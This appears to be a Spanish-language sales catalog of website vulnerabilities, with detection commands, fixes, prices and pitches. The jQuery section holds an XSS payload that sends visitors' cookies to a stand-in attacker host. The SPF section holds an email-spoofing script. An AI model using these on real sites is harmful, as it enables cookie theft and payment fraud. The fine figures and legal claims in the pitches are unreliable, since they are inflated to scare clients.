# 🔍 CATÁLOGO COMPLETO DE VULNERABILIDADES

**Para:** Abraham Haddioui  
**Objetivo:** Entender QUÉ es cada vulnerabilidad, QUÉ significa, y CÓMO se soluciona

---

## 🚨 CRÍTICAS (Score: 40 puntos cada una)

### 1. GDPR_NO_COOKIE_CONSENT

**QUÉ ES:**
Web usa cookies de tracking (Google Analytics, Facebook Pixel, etc.) sin mostrar banner de consentimiento ANTES de cargarlas.

**CÓMO LO DETECTAMOS:**
```bash
# Buscamos scripts analytics
curl -s $URL | grep -E 'google-analytics|gtag|_ga|facebook-pixel|fbq'

# Buscamos banner consent
curl -s $URL | grep -E 'cookie.consent|cookiebot|onetrust'

# Si hay analytics PERO NO hay banner = INFRACCIÓN
```

**QUÉ SIGNIFICA TENERLA:**
- **Ilegal desde 2019** (sentencia TJUE Planeta49)
- Cada visita = 1 infracción
- 1.000 visitas/día = 365.000 infracciones/año
- **AEPD inspecciona activamente 2024**

**CÓMO AFECTA AL NEGOCIO:**
- Multa: €20.000 - €300.000
- Precedente real: Vueling multada €30.000 (2023)
- No es "podría pasar", ES inspección activa

**CÓMO SE SOLUCIONA:**

**Opción A - Básica (€490):**
1. Instalar Cookiebot (€9/mes) o OneTrust
2. Configurar GA4 en modo "consent mode"
3. Redactar política de cookies
4. Publicar en `/cookies`
5. Test: cookies NO cargan hasta click "Aceptar"

**Opción B - Completa (€890):**
- Todo lo anterior +
- Privacy Policy actualizada
- Integración con CMP (Consent Management Platform)
- Audit log de consentimientos
- Prueba pasa inspección AEPD

**Tiempo:** 2 días  
**Garantía:** Pasa inspección

**PITCH:**
> "Usa Google Analytics sin pedir permiso. Cada visita = infracción. 1.000 visitas/día = €200M riesgo acumulado (€20K × 10.000). AEPD inspecciona activamente. €490 lo arregla en 48h o esperamos multa €20K-300K."

---

### 2. GDPR_NO_PRIVACY_POLICY

**QUÉ ES:**
No existe página `/privacy-policy` o `/privacidad` con política de privacidad compliant GDPR.

**CÓMO LO DETECTAMOS:**
```bash
# Buscamos en paths comunes
for path in /privacy /privacy-policy /privacidad /politica-privacidad; do
    curl -s "$URL$path" | grep -i 'gdpr\|rgpd\|datos.personales'
done

# Si ninguno tiene contenido legal = INFRACCIÓN
```

**QUÉ SIGNIFICA TENERLA:**
- **GDPR Art. 13:** Obligatorio ANTES de recoger datos
- Sin privacy policy = NO PUEDES tener formularios
- Cada formulario enviado = infracción

**CÓMO AFECTA AL NEGOCIO:**

**Ejemplo real Restaurante:**
- 100 reservas/mes por formulario
- Sin privacy policy = 100 infracciones/mes
- €10.000 × 100 = **€1.000.000 riesgo mes**
- AEPD: "Ignorancia no exime"

**Ejemplo real Asesoría:**
- Manejan datos fiscales (categoría especial)
- Sin privacy = negligencia profesional
- Pueden perder colegiación
- Clientes pueden demandar

**CÓMO SE SOLUCIONA:**

**Opción A - Privacy Policy Solo (€390):**
1. Entrevista: qué datos recogen, para qué, cuánto tiempo
2. Redacción legal adaptada sector
3. Incluir: base legal, derechos ARCO, DPO, transferencias
4. Publicación `/privacidad`
5. Link en footer + formularios

**Opción B - GDPR Compliance (€890):**
- Privacy Policy +
- Cookie Policy +
- Terms & Conditions +
- Aviso Legal (LSSI) +
- Registro actividades tratamiento (Art. 30)

**Tiempo:** 1-2 días  
**Formato:** Documento legal firmado abogado

**PITCH:**
> "Sin Privacy Policy, cada cliente que envía formulario = infracción €10.000. Si reciben 10 contactos/día = €100.000 en 10 días. €390 redacción legal HOY o multas acumuladas mañana."

---

### 3. GDPR_FORM_NO_HTTPS

**QUÉ ES:**
Formulario de contacto/reservas en página HTTP (sin candado), enviando datos sin cifrar.

**CÓMO LO DETECTAMOS:**
```bash
# Check si URL es HTTP
if [[ "$URL" =~ ^http:// ]]; then
    # Check si tiene formularios
    if curl -s "$URL" | grep -E '<form|<input.*email|<input.*password'; then
        echo "CRÍTICO: Formulario sin cifrado"
    fi
fi
```

**QUÉ SIGNIFICA TENERLA:**
- **GDPR Art. 32:** Medidas técnicas obligatorias
- Datos viajan "en claro" por internet
- Cualquiera en WiFi pública puede interceptar
- Email, teléfono, nombre = expuestos

**CÓMO AFECTA AL NEGOCIO:**

**Si hay filtración:**
1. **Notificación AEPD 72h** (obligatorio)
2. Notificación a TODOS los afectados
3. Sanción: €200.000+
4. Clientes pueden demandar daños
5. Prensa: "Empresa X filtró datos clientes"

**CÓMO SE SOLUCIONA:**

**Opción A - SSL Básico (€290):**
1. Certificado SSL (Let's Encrypt gratis o comercial)
2. Instalación en servidor
3. Redirect HTTP → HTTPS (301)
4. Update links internos
5. Test formulario cifrado

**Opción B - SSL + Hardening (€590):**
- Todo lo anterior +
- HSTS header (fuerza HTTPS)
- Security headers completos
- Hardening formularios (CSRF tokens)
- Sanitización inputs
- Rate limiting anti-spam

**Tiempo:** 4 horas - 1 día  

**PITCH:**
> "Formulario envía datos SIN cifrar. Si interceptan datos cliente = notificación AEPD 72h obligatoria. Sanción €200K. Cada formulario = bomba de tiempo. €590 lo cifra en 24h."

---

### 4. SSL_EXPIRED

**QUÉ ES:**
Certificado SSL/TLS caducado. Navegadores bloquean acceso a web.

**CÓMO LO DETECTAMOS:**
```bash
# Check expiration date
echo | openssl s_client -connect "$domain:443" -servername "$domain" 2>/dev/null | \
    openssl x509 -noout -dates

# notAfter < NOW = EXPIRADO
```

**QUÉ SIGNIFICA TENERLA:**
- **Chrome:** Bloquea acceso directo (ERR_CERT_DATE_INVALID)
- **Firefox:** Warning pantalla roja
- **Safari:** "Esta conexión no es privada"
- **Resultado:** 0% visitantes pueden acceder

**CÓMO AFECTA AL NEGOCIO:**

**Impacto inmediato:**
- Pérdida 100% tráfico web
- 0 reservas / 0 ventas / 0 contactos
- Cada hora sin web = dinero perdido
- Hosting puede suspender sitio

**Ejemplo real:**
- Restaurante 2* Michelin
- SSL expira viernes noche
- Fin de semana: 0 reservas
- Pérdida: €20.000 (100 comensales × €200)
- Arreglo lunes: **Tarde, daño hecho**

**CÓMO SE SOLUCIONA:**

**URGENTE - SSL Emergency (€290):**
1. Renovación inmediata certificado
2. Instalación + configuración
3. Verificación todos subdominios
4. Test navegadores
5. **Tiempo: 2 horas**

**PREVENCIÓN - SSL + Monitoring (€590):**
- Todo lo anterior +
- Alertas auto-renovación
- Monitoring 24/7
- Renovación automática
- **Nunca más vuelve a pasar**

**PITCH:**
> "SSL EXPIRADO. Navegadores bloquean su web AHORA MISMO. Cada minuto = clientes perdidos. €290, resuelto en 2 horas. O sigue perdiendo €X por hora. ¿Cuánto vale cada hora sin web?"

---

### 5. AI_ACT_NO_DISCLOSURE

**QUÉ ES:**
Web usa chatbot con IA (Intercom, Drift, Zendesk) sin declaración legal del uso de IA.

**CÓMO LO DETECTAMOS:**
```bash
# Detectar chatbots IA
curl -s "$URL" | grep -E 'intercom.com|drift.com|crisp.chat|zendesk.*chat'

# Buscar declaración
curl -s "$URL/ai-disclosure" | grep -i 'artificial.intelligence|IA'

# Si chatbot SÍ pero declaración NO = INFRACCIÓN
```

**QUÉ SIGNIFICA TENERLA:**
- **EU AI Act 2024:** Vigente desde Agosto
- Obligatorio declarar uso sistemas IA
- Chatbots = "sistemas IA de propósito general"
- **NUEVO:** Casi nadie lo sabe todavía

**CÓMO AFECTA AL NEGOCIO:**

**Multas AI Act:**
- Tier 2: €15M o 3% facturación global
- **Más grande que GDPR** (GDPR: €20M o 4%)
- Inspecciones empiezan 2025-2026
- **Ventana 12 meses para adelantarse**

**Ejemplo:**
- Gimnasio con Intercom chatbot
- Facturación: €500.000/año
- 3% = €15.000 (multa mínima)
- O directamente €15M si inspección considera grave

**CÓMO SE SOLUCIONA:**

**Opción A - AI Compliance Básico (€500):**
1. Auditoría sistemas IA usados
2. Identificar: chatbot, recomendaciones, analytics ML
3. Redacción declaración legal
4. Publicar `/ai-disclosure`
5. Update Privacy Policy con IA

**Opción B - AI + GDPR Full (€1.200):**
- Todo lo anterior +
- GDPR compliance completo
- Cookie consent
- Privacy Policy
- Terms IA-specific

**Tiempo:** 2 días  

**PITCH:**
> "Usa chatbot IA sin declarar. EU AI Act 2024: multa €15 millones. Inspecciones 2025. Son de los PRIMEROS en saberlo. Competencia todavía no. Adelántese por €500. Cuando empiecen multas 2025, ustedes ya protegidos."

---

### 6. VULN_WORDPRESS_OLD

**QUÉ ES:**
WordPress versión < 6.0 con vulnerabilidades (CVEs) públicas conocidas.

**CÓMO LO DETECTAMOS:**
```bash
# Detectar WordPress
curl -s "$URL" | grep -E 'wp-content.*ver=([0-5]\.|6\.0)'

# Versión detectada < 6.4 = vulnerable
```

**CVEs COMUNES:**
- CVE-2021-29447: XXE en biblioteca XML
- CVE-2022-21661: SQL Injection
- CVE-2023-2745: Path Traversal
- **100+ CVEs públicos** en versiones viejas

**QUÉ SIGNIFICA TENERLA:**
- Scripts automáticos escanean internet 24/7
- Buscan versiones vulnerables
- Exploit automático
- **70% webs hackeadas = WordPress sin actualizar**

**CÓMO AFECTA AL NEGOCIO:**

**Escenario hackeo:**
1. Bot detecta WordPress 5.8
2. Exploit CVE-2022-21661 (SQL Injection)
3. Acceso base de datos
4. Robo: emails, teléfonos, pedidos, datos pago
5. **Obligación legal:** Notificar AEPD 72h
6. **Obligación legal:** Notificar TODOS afectados
7. Sanción GDPR: €200.000+ (fallo medidas técnicas Art.32)
8. Demandas clientes
9. Prensa: "Restaurante X hackeado, datos robados"
10. **Reputación destruida**

**Ejemplo real 3* Michelin:**
- DiverXO hackeado = prensa nacional
- Pérdida reputación > pérdida económica
- Cliente: "¿Confío tarjeta a web hackeada?"

**CÓMO SE SOLUCIONA:**

**Opción A - Update Básico (€390):**
1. Backup completo (BD + archivos)
2. Update WordPress core
3. Update TODOS los plugins
4. Update theme
5. Test funcionamiento
6. Scan vulnerabilidades post-update

**Opción B - Security Overhaul (€890):**
- Todo lo anterior +
- WAF (Wordfence Premium) €99/año
- Hardening avanzado:
  - wp-config.php protección
  - Permisos archivos correctos
  - .htaccess security rules
  - Disable XML-RPC
  - Disable file editing
- 2FA admin
- Monitoring 6 meses

**Opción C - Migración Stack Moderno (€5.800-8.500):**
- **Para 3* Michelin / Luxury brands:**
- Migrar a Next.js + Headless CMS
- NO más WordPress
- Stack profesional
- CDN global (Vercel)
- **Nunca más vulnerabilidades WP**

**Tiempo:** 4h (update) / 1 día (overhaul) / 3 semanas (migración)

**PITCH:**
> "WordPress obsoleto con CVEs públicos. Hackeo inminente. Si roban datos = notificación AEPD 72h + sanción €200K + reputación destruida. Restaurante Michelin hackeado = prensa nacional. €890 lo protege o esperamos hackeo inevitable."

---

## 🟡 ALTAS (Score: 20 puntos cada una)

### 7. SECURITY_NO_HSTS

**QUÉ ES:**
Sitio HTTPS sin header `Strict-Transport-Security` (HSTS).

**CÓMO LO DETECTAMOS:**
```bash
curl -sI "$URL" | grep -i "strict-transport-security"
# Si no aparece = vulnerable
```

**QUÉ SIGNIFICA TENERLA:**
Vulnerable a **SSL Stripping attack**:
1. Usuario en WiFi público (café, aeropuerto)
2. Escribe `ejemplo.com` (sin https://)
3. Primera conexión = HTTP
4. Atacante intercepta
5. **Downgrade attack:** Mantiene HTTP aunque web soporte HTTPS
6. Atacante ve TODO el tráfico

**CÓMO AFECTA:**
- Interceptación datos formularios
- Robo cookies sesión
- Man-in-the-middle

**CÓMO SE SOLUCIONA:**
```nginx
# Nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# Apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```

**Precio:** €150 (parte de Security Headers bundle €290)  
**Tiempo:** 15 minutos

---

### 8. EMAIL_NO_SPF

**QUÉ ES:**
Dominio sin SPF record en DNS. Emails fácilmente falsificables.

**CÓMO LO DETECTAMOS:**
```bash
dig +short TXT ejemplo.com | grep "v=spf1"
# Si vacío = sin SPF
```

**QUÉ SIGNIFICA TENERLA:**
Cualquiera puede enviar emails como `info@tuempresa.com`:
```python
import smtplib
msg = "From: reservas@restaurante-michelin.com\n"
msg += "To: cliente@gmail.com\n"
msg += "Subject: Confirme pago reserva\n\n"
msg += "Pague €500 a cuenta: ES12..."
# Enviado sin problema
```

**Cliente recibe email aparentemente legítimo:**
- De: reservas@restaurante-michelin.com
- Asunto: Confirme pago reserva
- Parece real
- Paga a cuenta falsa
- **Dinero perdido**

**Cliente demanda restaurante REAL:**
- "Su email me pidió pagar"
- Restaurante: "No fuimos nosotros"
- Cliente: "¿Cómo lo sé? Su email dice que sí"
- **Pérdida reputación + posible indemnización**

**CÓMO SE SOLUCIONA:**
```bash
# Añadir TXT record DNS:
ejemplo.com TXT "v=spf1 include:_spf.google.com -all"
#                          ↑ tu servidor email      ↑ rechazar otros
```

**Precio:** €200 (SPF solo) / €390 (SPF + DMARC + CAA completo)  
**Tiempo:** 2 horas

**PITCH:**
> "Sin SPF, scammers envían emails falsos en su nombre pidiendo pagos. Cliente paga. Dinero perdido. Cliente demanda a ustedes. €390 protege email + reputación."

---

### 9. VULN_JQUERY_XSS

**QUÉ ES:**
jQuery versión < 3.5.0 vulnerable a XSS (CVE-2020-11022, CVE-2020-11023).

**CÓMO LO DETECTAMOS:**
```bash
curl -s "$URL" | grep -oP 'jquery[^"]*\K[12]\.[0-9]+|3\.[0-4]'
# Si versión < 3.5 = vulnerable
```

**QUÉ SIGNIFICA TENERLA:**
Atacante puede inyectar código malicioso:
```html
<!-- Comentario blog/review con XSS payload -->
<img src=x onerror="
  fetch('https://atacante.com/robar?cookie='+document.cookie)
">

<!-- jQuery vulnerable ejecuta el código -->
<!-- Roba cookies sesión de TODOS los visitantes -->
```

**CÓMO AFECTA:**
- Robo cookies admin
- Defacement web
- Redirect a sitio malicioso
- Keylogger en formularios

**CÓMO SE SOLUCIONA:**
1. Update jQuery a 3.7+ (última)
2. Test NO rompe funcionalidad
3. Si rompe: fix código dependiente

**Precio:** €290 (Frontend Security Update)  
**Tiempo:** 4 horas

---

## 🟢 MEDIAS (Score: 10 puntos cada una)

### 10-15. Security Headers Missing

**EMAIL_NO_DMARC, SECURITY_NO_FRAME_PROTECTION, SECURITY_NO_CSP, etc.**

**Qué son:** Headers HTTP que añaden capas protección.

**Cómo se solucionan:**
```nginx
# Nginx config
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

**Precio:** €290 (Security Headers Complete bundle)  
**Tiempo:** 1 hora  

---

## 💰 TABLA PRICING POR CATEGORÍA

| Vulnerabilidad | Precio Mínimo | Precio PYME | Precio Premium | Precio Luxury/Michelin |
|----------------|---------------|-------------|----------------|------------------------|
| Cookie Consent | €490 | €890 | €1.290 | €1.790 |
| Privacy Policy | €390 | €890 | €1.290 | €1.790 |
| SSL Expired | €290 | €590 | €890 | €1.290 |
| WordPress Old | €390 | €890 | €1.490 | €5.800-8.500 (migración) |
| AI Act | €500 | €1.200 | €2.200 | €3.500 |
| Security Headers | €290 | €490 | €890 | €1.290 |
| Email Security | €390 | €890 | €1.490 | €2.200 |
| **PAQUETE COMPLETO** | **€2.490** | **€3.800** | **€5.800** | **€12.000-15.000** |

**Factores que aumentan precio:**
- ✅ Michelin stars (reputación)
- ✅ Luxury brand (exigencia cliente)
- ✅ Datos sensibles (salud, fiscal, legal)
- ✅ Alto tráfico (más riesgo)
- ✅ E-commerce (transacciones)

---

**PREPARADO POR:** Abraham Haddioui + ARGUS  
**PRÓXIMO:** Escaneo Gelderland/Arnhem con pricing Holanda (+30%)
